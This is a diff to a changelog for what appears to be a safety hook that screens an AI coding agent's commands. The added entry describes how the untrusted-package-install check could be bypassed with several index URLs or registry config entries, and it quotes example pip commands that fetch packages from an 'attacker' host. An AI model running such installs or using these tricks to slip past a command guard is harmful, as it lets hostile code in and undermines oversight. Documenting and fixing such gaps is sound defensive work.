@@ -126,6 +126,16 @@ outdated and why, and prints the exact command to re-run.
   Code treats a timed-out hook as a non-blocking error, so the command would run
   unchecked. The flag is now `-[A-Za-z-]+` (the same strings, one way to split
   them), and an `rm` right after `-` (`--rm`, a flag) no longer starts a scan.
+- **Every package index / registry URL is checked, not just one.** The
+  untrusted-install check looked at a single `--index-url`/`--extra-index-url`
+  per command (the last on the line) and a single direct package URL, and the
+  config check at the first registry assignment in a file. So
+  `pip install x --extra-index-url http://attacker/simple --index-url https://pypi.org/simple`,
+  `pip install http://attacker/evil.whl https://files.pythonhosted.org/…/ok.whl`
+  and a `pip.conf` / `.npmrc` that sets the official default first and an
+  `extra-index-url` / scoped `@acme:registry` to an attacker host after it were
+  all allowed. Each URL is now checked. Over the 190 docs and config files in
+  `node_modules` plus this repo's `package-lock.json`, no verdict changed.
 - **`SANITATION_VERSION` bumped to `2`.** The classifier fixes above would
   otherwise leave already-stored poison grandfathered — a record signed with a
   valid v1 integrity marker loads on the fast path with no re-scan. The bump
